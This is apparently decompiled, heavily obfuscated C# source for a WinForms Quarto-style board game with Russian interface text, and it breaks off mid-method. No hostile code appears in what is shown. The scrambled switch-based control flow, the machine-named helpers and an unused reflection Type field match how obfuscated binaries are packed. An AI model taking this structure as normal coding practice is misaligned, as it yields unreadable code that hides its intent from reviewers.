using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 1139963041;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x489750A2u) % 3u)
					{
					case 1u:
						goto IL_0008;
					case 0u:
						break;
					default:
						Point = copy.Point;
						return;
					}
					break;
					IL_0008:
					Dark = copy.Dark;
					Big = copy.Big;
					Square = copy.Square;
					num = (int)(num2 * 1609444050) ^ -979242060;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 219755245;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x947959Fu) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -840288138) ^ 0x1EDE445B;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 184807441;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x773E02C3u) % 10u)
				{
				case 8u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 451004564;
					continue;
				case 7u:
					num = ((int)num2 * -73932775) ^ -1626643386;
					continue;
				case 6u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -904024534) ^ 0x228C5558;
					continue;
				case 5u:
					num = 1018451481;
					continue;
				case 3u:
					num = ((int)num2 * -61234074) ^ 0x43E974AB;
					continue;
				case 2u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1190077335) ^ -793577806;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1684537167;
						num4 = -1684537167;
					}
					else
					{
						num3 = -966375896;
						num4 = -966375896;
					}
					num = num3 ^ ((int)num2 * -1384644890);
					continue;
				}
				case 0u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -2100487595) ^ -1804269709;
					continue;
				}
				default:
					return;
				case 9u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1482269785;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x46232977u) % 19u)
				{
				case 18u:
					num3++;
					num = ((int)num2 * -1314088941) ^ -204629732;
					continue;
				case 17u:
					num4 = 0;
					num = ((int)num2 * -327315082) ^ 0x693CC1A0;
					continue;
				case 16u:
					num = (int)(num2 * 1878846218) ^ -682788537;
					continue;
				case 15u:
					num4++;
					num = (int)((num2 * 1357043250) ^ 0x5724AE75);
					continue;
				case 14u:
					Paint_Storage();
					num = ((int)num2 * -482747100) ^ -961617664;
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1344784684) ^ 0x4E5FA19A;
					continue;
				case 12u:
				{
					int num7;
					if (num3 >= 4)
					{
						num = 1497257335;
						num7 = 1497257335;
					}
					else
					{
						num = 1544951976;
						num7 = 1544951976;
					}
					continue;
				}
				case 10u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 992764888) ^ -46622724;
					continue;
				case 9u:
					num = 1806448448;
					continue;
				case 7u:
					board = new Figurine[4, 4];
					num = (int)(num2 * 2004827366) ^ -213401921;
					continue;
				case 6u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = ((int)num2 * -1485203194) ^ -1152455687;
					continue;
				case 5u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -1527837366;
						num6 = -1527837366;
					}
					else
					{
						num5 = -845710550;
						num6 = -845710550;
					}
					num = num5 ^ ((int)num2 * -145571504);
					continue;
				}
				case 4u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = (int)((num2 * 754653288) ^ 0x7086A92);
					continue;
				case 3u:
					Paint_Board();
					num = (int)((num2 * 599011086) ^ 0x75CBC949);
					continue;
				case 2u:
					num = (int)((num2 * 920052187) ^ 0x417933AC);
					continue;
				case 1u:
					flag = num4 < 4;
					num = 633910323;
					continue;
				case 0u:
					num3 = 0;
					num = 140373706;
					continue;
				case 8u:
					break;
				default:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
		bool flag = default(bool);
		float num5 = default(float);
		bool big = default(bool);
		float num11 = default(float);
		float num8 = default(float);
		float num12 = default(float);
		bool square = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		Brush brush_ = default(Brush);
		float num7 = default(float);
		Graphics graphics_ = default(Graphics);
		while (true)
		{
			int num = 1330161763;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7D56EA13u) % 40u)
				{
				case 38u:
				{
					int num19;
					int num20;
					if (flag)
					{
						num19 = 466479357;
						num20 = 466479357;
					}
					else
					{
						num19 = 258903016;
						num20 = 258903016;
					}
					num = num19 ^ ((int)num2 * -530644379);
					continue;
				}
				case 37u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1585787931) ^ -1354655098;
					continue;
				case 36u:
					num = ((int)num2 * -1406666464) ^ 0x3CA1AAA4;
					continue;
				case 35u:
					num5 = 0.7f;
					num = 1546319676;
					continue;
				case 34u:
					num = ((int)num2 * -1956573762) ^ -853094805;
					continue;
				case 33u:
					num = (int)(num2 * 890811069) ^ -354106318;
					continue;
				case 32u:
				{
					int num15;
					int num16;
					if (big)
					{
						num15 = -664613880;
						num16 = -664613880;
					}
					else
					{
						num15 = -1370233552;
						num16 = -1370233552;
					}
					num = num15 ^ (int)(num2 * 198638660);
					continue;
				}
				case 31u:
					num11 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 1072068963;
					continue;
				case 30u:
					num8 = num12 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num4, num3].Square;
					num = ((int)num2 * -558358513) ^ 0x1CF8BE08;
					continue;
				case 29u:
					num = ((int)num2 * -2101970103) ^ 0x4AF8EC63;
					continue;
				case 28u:
					flag2 = board[num4, num3] != null;
					num = ((int)num2 * -1432217711) ^ 0x1158F6A3;
					continue;
				case 27u:
				{
					int num21;
					int num22;
					if (board[num4, num3].Dark)
					{
						num21 = -1514611050;
						num22 = -1514611050;
					}
					else
					{
						num21 = -1643306264;
						num22 = -1643306264;
					}
					num = num21 ^ (int)(num2 * 218120993);
					continue;
				}
				case 26u:
				{
					num8 = num12 * 0.4f / (float)Form1.smethod_27(2.0);
					int num17;
					int num18;
					if (!board[num4, num3].Point)
					{
						num17 = -1228501686;
						num18 = -1228501686;
					}
					else
					{
						num17 = -408978418;
						num18 = -408978418;
					}
					num = num17 ^ (int)(num2 * 418511902);
					continue;
				}
				case 25u:
				{
					int num13;
					int num14;
					if (!square)
					{
						num13 = 1253920609;
						num14 = 1253920609;
					}
					else
					{
						num13 = 1355803711;
						num14 = 1355803711;
					}
					num = num13 ^ (int)(num2 * 1068123287);
					continue;
				}
				case 24u:
					brush_ = Form1.smethod_26();
					num = 1964761016;
					continue;
				case 23u:
					num11 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num12 = (float)size * num5;
					num7 = (float)size * (num11 / 2f);
					num = 329836005;
					continue;
				case 22u:
					num = ((int)num2 * -301845998) ^ -298386020;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, brush_, num7 + (float)(num3 * size), num7 + (float)(num4 * size), num8, num8);
					num = 1149472965;
					continue;
				case 20u:
					num = 464129740;
					continue;
				case 19u:
					big = board[num4, num3].Big;
					num = 744705987;
					continue;
				case 18u:
					num4++;
					num = (int)((num2 * 1811448538) ^ 0x6358B7AE);
					continue;
				case 17u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num7 + (float)(num3 * size), num7 + (float)(num4 * size), num8, num8);
					num = ((int)num2 * -504738018) ^ 0x6AB3C0A0;
					continue;
				case 16u:
					num7 = (float)size * (num11 / 2f);
					num = ((int)num2 * -1629113646) ^ 0x31286271;
					continue;
				case 15u:
					num3++;
					num = ((int)num2 * -795561120) ^ -2109347561;
					continue;
				case 14u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 533419981) ^ 0x35108382);
					continue;
				case 13u:
					num = 756215383;
					continue;
				case 12u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 809127789;
						num10 = 809127789;
					}
					else
					{
						num9 = 1055217839;
						num10 = 1055217839;
					}
					num = num9 ^ ((int)num2 * -1949507654);
					continue;
				}
				case 11u:
					Form1.smethod_28(graphics_, brush_, num7 + (float)(num3 * size), num7 + (float)(num4 * size), num8, num8);
					num = ((int)num2 * -1984466741) ^ -1958779757;
					continue;
				case 10u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num3 + 0.05f) * (float)size, ((float)num4 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = 959693778;
					continue;
				case 9u:
					num = ((int)num2 * -2030480105) ^ 0x3F852E48;
					continue;
				case 8u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1101306568) ^ -520119610;
					continue;
				case 7u:
					num = (int)((num2 * 166911175) ^ 0x3C36DAA1);
					continue;
				case 6u:
					num = ((int)num2 * -1926311599) ^ -1426766446;
					continue;
				case 5u:
					num4 = 0;
					num = (int)((num2 * 1953142674) ^ 0x1E099B70);
					continue;
				case 4u:
				{
					int num6;
					if (num3 < 4)
					{
						num = 632151465;
						num6 = 632151465;
					}
					else
					{
						num = 1125515209;
						num6 = 1125515209;
					}
					continue;
				}
				case 3u:
					num5 = 1f;
					num = (int)((num2 * 2021424951) ^ 0x6511D4B1);
					continue;
				case 1u:
					flag = num4 < 4;
					num = 1657946357;
					continue;
				case 0u:
					num3 = 0;
					num = 1984865729;
					continue;
				default:
					return;
				case 39u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		float num8 = default(float);
		float num7 = default(float);
		float num9 = default(float);
		Brush brush_ = default(Brush);
		int num3 = default(int);
		bool dark = default(bool);
		bool flag3 = default(bool);
		int num4 = default(int);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		float num18 = default(float);
		float num19 = default(float);
		bool point = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1671610008;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9FF5B2AEu) % 36u)
				{
				case 34u:
					num8 = 1f - num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num9 = (float)size * (num8 / 2f) - 4f;
					num = -663384815;
					continue;
				case 33u:
					brush_ = Form1.smethod_26();
					num = -1587342730;
					continue;
				case 32u:
					num7 = 1f;
					num = (int)((num2 * 681432535) ^ 0x15016E4);
					continue;
				case 31u:
					num3 = 0;
					num = -1482085930;
					continue;
				case 30u:
					num8 = 1f - num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -165031294;
					continue;
				case 29u:
				{
					int num16;
					int num17;
					if (!dark)
					{
						num16 = -1982097736;
						num17 = -1982097736;
					}
					else
					{
						num16 = -232021186;
						num17 = -232021186;
					}
					num = num16 ^ (int)(num2 * 1838121307);
					continue;
				}
				case 28u:
					num = ((int)num2 * -1226698469) ^ -878985118;
					continue;
				case 27u:
				{
					int num14;
					int num15;
					if (!flag3)
					{
						num14 = -1425045499;
						num15 = -1425045499;
					}
					else
					{
						num14 = -655446559;
						num15 = -655446559;
					}
					num = num14 ^ (int)(num2 * 760839224);
					continue;
				}
				case 26u:
					flag3 = num4 < 4;
					num = -1718771215;
					continue;
				case 25u:
				{
					int num10;
					int num11;
					if (!flag2)
					{
						num10 = -300484540;
						num11 = -300484540;
					}
					else
					{
						num10 = -1262529459;
						num11 = -1262529459;
					}
					num = num10 ^ (int)(num2 * 1029395586);
					continue;
				}
				case 24u:
				{
					int num21;
					if (storage[num4, num3].Big)
					{
						num = -604021702;
						num21 = -604021702;
					}
					else
					{
						num = -266462515;
						num21 = -266462515;
					}
					continue;
				}
				case 23u:
					num = ((int)num2 * -790823936) ^ -902055496;
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)pictureBox[num4, num3]);
					num = -1174209566;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num9, num9, num18, num18);
					num = (int)((num2 * 1590354601) ^ 0x6BDFB061);
					continue;
				case 20u:
				{
					int num20;
					if (storage[num4, num3] != null)
					{
						num = -944315225;
						num20 = -944315225;
					}
					else
					{
						num = -232177286;
						num20 = -232177286;
					}
					continue;
				}
				case 19u:
					num = (int)((num2 * 918173410) ^ 0x3CE9F677);
					continue;
				case 18u:
					num4 = 0;
					num = (int)(num2 * 1692865856) ^ -1610035437;
					continue;
				case 17u:
					num = ((int)num2 * -971388355) ^ 0x61722B5D;
					continue;
				case 16u:
					num3++;
					num = -1482085930;
					continue;
				case 15u:
					num18 = num19 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num4, num3].Point;
					num = (int)((num2 * 1309130715) ^ 0x611197EA);
					continue;
				case 13u:
					Form1.smethod_28(graphics_, brush_, num9, num9, num18, num18);
					num = (int)((num2 * 227045116) ^ 0x7F8423D4);
					continue;
				case 12u:
					num19 = (float)size * num7;
					num = ((int)num2 * -982712744) ^ -263091557;
					continue;
				case 11u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num4, num3]));
					dark = storage[num4, num3].Dark;
					num = ((int)num2 * -1327228821) ^ -854866426;
					continue;
				case 10u:
					num4++;
					num = ((int)num2 * -1595569729) ^ -958934990;
					continue;
				case 9u:
					num9 = (float)size * (num8 / 2f) - 4f;
					num18 = num19 * 0.9f / (float)Form1.smethod_27(2.0);
					flag2 = num3 < 2;
					num = ((int)num2 * -796846057) ^ -1830028784;
					continue;
				case 8u:
					Form1.smethod_24(graphics_, brush_, num9, num9, num18, num18);
					num = -1216516680;
					continue;
				case 7u:
					num7 = 0.7f;
					num = -1356622680;
					continue;
				case 6u:
					num = (int)(num2 * 1303667208) ^ -1587527787;
					continue;
				case 5u:
				{
					int num12;
					int num13;
					if (!point)
					{
						num12 = -1181118412;
						num13 = -1181118412;
					}
					else
					{
						num12 = -1361530781;
						num13 = -1361530781;
					}
					num = num12 ^ ((int)num2 * -1366186304);
					continue;
				}
				case 4u:
					num = ((int)num2 * -188121974) ^ -1233675094;
					continue;
				case 3u:
					brush_ = Form1.smethod_25();
					num = (int)(num2 * 1529354883) ^ -808932909;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -361331240;
						num6 = -361331240;
					}
					else
					{
						num5 = -966570306;
						num6 = -966570306;
					}
					num = num5 ^ ((int)num2 * -865621334);
					continue;
				}
				case 1u:
					Form1.smethod_20(pictureBox[num4, num3], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num4, num3]), Form1.smethod_16((Control)(object)pictureBox[num4, num3])));
					num = ((int)num2 * -2001171474) ^ -721677825;
					continue;
				case 0u:
					flag = num3 < 4;
					num = -590926288;
					continue;
				default:
					return;
				case 14u:
					break;
				case 35u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		bool flag3 = default(bool);
		int num7 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -80311951;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB76E6F83u) % 30u)
				{
				case 29u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 1997460496) ^ -1208389284;
					continue;
				case 28u:
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 2044914140) ^ 0x7C918BB3);
					continue;
				case 27u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 791801452) ^ 0x113F30DF);
					continue;
				case 26u:
					step = 1;
					num = ((int)num2 * -2052088436) ^ -1249810538;
					continue;
				case 25u:
					flag3 = turn;
					num = (int)((num2 * 1771331767) ^ 0x2CD3344E);
					continue;
				case 24u:
				{
					int num10 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num7, num10], Color.Blue);
					num = ((int)num2 * -273367341) ^ 0x7637100D;
					continue;
				}
				case 23u:
					num = -2078266881;
					continue;
				case 22u:
					num3 = 0;
					num = ((int)num2 * -854070920) ^ 0x5FA805BF;
					continue;
				case 21u:
					num = (int)(num2 * 872133667) ^ -1580529549;
					continue;
				case 20u:
					num3++;
					num = (int)((num2 * 1952879092) ^ 0x38043670);
					continue;
				case 19u:
					step = 0;
					num = ((int)num2 * -1281152046) ^ -1831801662;
					continue;
				case 18u:
					num = ((int)num2 * -1297740860) ^ 0x4A86FEDC;
					continue;
				case 17u:
					num = (int)(num2 * 525809464) ^ -1358960680;
					continue;
				case 16u:
					num = ((int)num2 * -1682634816) ^ 0x23E834A8;
					continue;
				case 15u:
					num4++;
					num = (int)(num2 * 245312768) ^ -1834494000;
					continue;
				case 14u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = 1441877846;
						num12 = 1441877846;
					}
					else
					{
						num11 = 527994356;
						num12 = 527994356;
					}
					num = num11 ^ ((int)num2 * -1032585552);
					continue;
				}
				case 13u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -1379151735) ^ -1198475430;
					continue;
				case 12u:
				{
					int num8;
					int num9;
					if (flag3)
					{
						num8 = -769934245;
						num9 = -769934245;
					}
					else
					{
						num8 = -226900646;
						num9 = -226900646;
					}
					num = num8 ^ (int)(num2 * 908813874);
					continue;
				}
				case 11u:
					flag2 = num3 < 4;
					num = -1992894201;
					continue;
				case 10u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -736272018) ^ 0x686C2550;
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1519384311;
					continue;
				case 8u:
					num7 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -879499344) ^ 0x6F714C85;
					continue;
				case 7u:
					flag = num4 < 4;
					num = -157097405;
					continue;
				case 6u:
					Form1_Load(this, Form1.smethod_31());
					num = ((int)num2 * -2134479022) ^ 0x23589AEA;
					continue;
				case 4u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1022392228) ^ 0x76DE28F0);
					continue;
				case 3u:
					num4 = 0;
					num = -1849154700;
					continue;
				case 2u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -64786730;
						num6 = -64786730;
					}
					else
					{
						num5 = -28611155;
						num6 = -28611155;
					}
					num = num5 ^ (int)(num2 * 2051745182);
					continue;
				}
				case 1u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = -1717148912;
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1706095828;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE49542EBu) % 4u)
				{
				case 3u:
					time = time.AddSeconds(1.0);
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)(num2 * 1777348143) ^ -462889189;
					continue;
				case 1u:
					num = ((int)num2 * -755638800) ^ 0x21EED5E5;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num4 = default(int);
		int num8 = default(int);
		bool flag3 = default(bool);
		int num5 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 168886497;
			while (true)
			{
				uint num2;
				int num13;
				switch ((num2 = (uint)num ^ 0x234294F8u) % 27u)
				{
				case 26u:
					num = ((int)num2 * -1401544370) ^ -1739875810;
					continue;
				case 25u:
					flag2 = num4 < 4;
					num = 2035878706;
					continue;
				case 24u:
					num8 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
					num = ((int)num2 * -980194642) ^ -1412118266;
					continue;
				case 23u:
					num = ((int)num2 * -360888793) ^ 0x575A2433;
					continue;
				case 22u:
					num = (int)((num2 * 534520416) ^ 0x3BE11D5E);
					continue;
				case 21u:
				{
					int num11;
					int num12;
					if (flag3)
					{
						num11 = -337561988;
						num12 = -337561988;
					}
					else
					{
						num11 = -963137359;
						num12 = -963137359;
					}
					num = num11 ^ (int)(num2 * 1589647847);
					continue;
				}
				case 19u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -640025025) ^ 0x26E02C83;
					continue;
				case 18u:
					Form1.smethod_5((Control)(object)borderBox[num8, num5], Color.Red);
					num = (int)(num2 * 1626462942) ^ -1608903944;
					continue;
				case 17u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = 815380331;
					continue;
				case 16u:
				{
					int num14;
					if (num3 >= 4)
					{
						num = 842793088;
						num14 = 842793088;
					}
					else
					{
						num = 1965649084;
						num14 = 1965649084;
					}
					continue;
				}
				case 15u:
					num13 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num8, num5]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_016c;
				case 14u:
					num4 = 0;
					num = 1105334438;
					continue;
				case 13u:
					if (storage[num8, num5] != null)
					{
						num = 1262124604;
						continue;
					}
					num13 = 0;
					goto IL_016c;
				case 12u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = 1571633176;
						num10 = 1571633176;
					}
					else
					{
						num9 = 1828066544;
						num10 = 1828066544;
					}
					num = num9 ^ ((int)num2 * -1078186423);
					continue;
				}
				case 11u:
					num = ((int)num2 * -726028618) ^ 0x53C9CBBF;
					continue;
				case 10u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = -1192484436;
						num7 = -1192484436;
					}
					else
					{
						num6 = -1491697651;
						num7 = -1491697651;
					}
					num = num6 ^ ((int)num2 * -479708156);
					continue;
				}
				case 9u:
					num = (int)(num2 * 1193878601) ^ -1374153351;
					continue;
				case 8u:
					num = ((int)num2 * -684111126) ^ -188628140;
					continue;
				case 7u:
					num5 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).X / size;
					num = (int)((num2 * 399720501) ^ 0x44A5BC3F);
					continue;
				case 6u:
					num3++;
					num = ((int)num2 * -2117875393) ^ -502743610;
					continue;
				case 5u:
					flag = num5 > 1;
					num = (int)(num2 * 157191413) ^ -130997625;
					continue;
				case 4u:
					num5 -= 4;
					num = ((int)num2 * -188820230) ^ -101849124;
					continue;
				case 3u:
					num4++;
					num = ((int)num2 * -146218214) ^ 0x604BF7F0;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -988555785) ^ -822876110;
					continue;
				case 0u:
					num3 = 0;
					num = ((int)num2 * -25594663) ^ 0x5B174C55;
					continue;
				default:
					return;
				case 20u:
					break;
				case 2u:
					return;
					IL_016c:
					flag3 = (byte)num13 != 0;
					num = 149695661;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0215: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		int num6 = default(int);
		int num4 = default(int);
		Graphics graphics_ = default(Graphics);
		int num3 = default(int);
		bool flag2 = default(bool);
		int num5 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 31281604;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0x297E4785u) % 28u)
				{
				case 27u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 976457821) ^ 0x1A9A276E);
					continue;
				case 25u:
					num6 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -890008795) ^ 0x7E5796BA;
					continue;
				case 24u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 825042307) ^ -1273545038;
					continue;
				case 23u:
					num4++;
					num = 218344637;
					continue;
				case 22u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -107435567) ^ -1747810401;
					continue;
				case 21u:
					num4 = 0;
					num = 218344637;
					continue;
				case 20u:
					num = ((int)num2 * -987911476) ^ 0x5ED0E2DB;
					continue;
				case 19u:
					num3 = 0;
					num = ((int)num2 * -1154247649) ^ -696789367;
					continue;
				case 18u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = 475209398;
						num9 = 475209398;
					}
					else
					{
						num8 = 1161541612;
						num9 = 1161541612;
					}
					num = num8 ^ ((int)num2 * -1229717756);
					continue;
				}
				case 17u:
					num = ((int)num2 * -1294616769) ^ 0x357ED005;
					continue;
				case 16u:
					Paint_Board();
					num = (int)((num2 * 1566857617) ^ 0x70230D40);
					continue;
				case 14u:
					num7 = ((board[num6, num5] == null) ? 1 : 0);
					goto IL_012d;
				case 13u:
					num = (int)((num2 * 1994431961) ^ 0x16F2BD30);
					continue;
				case 12u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = 1248736942;
						num14 = 1248736942;
					}
					else
					{
						num13 = 432952970;
						num14 = 432952970;
					}
					num = num13 ^ ((int)num2 * -226789339);
					continue;
				}
				case 11u:
					num = (int)(num2 * 1026998208) ^ -579998674;
					continue;
				case 10u:
				{
					int num11;
					int num12;
					if (flag)
					{
						num11 = 1864021566;
						num12 = 1864021566;
					}
					else
					{
						num11 = 317718616;
						num12 = 317718616;
					}
					num = num11 ^ ((int)num2 * -733962959);
					continue;
				}
				case 9u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 428020978) ^ 0x46EDD113);
					continue;
				case 8u:
				{
					int num10;
					if (num4 >= 4)
					{
						num = 575119444;
						num10 = 575119444;
					}
					else
					{
						num = 1785025253;
						num10 = 1785025253;
					}
					continue;
				}
				case 7u:
					num = (int)((num2 * 333154973) ^ 0xD3690D5);
					continue;
				case 6u:
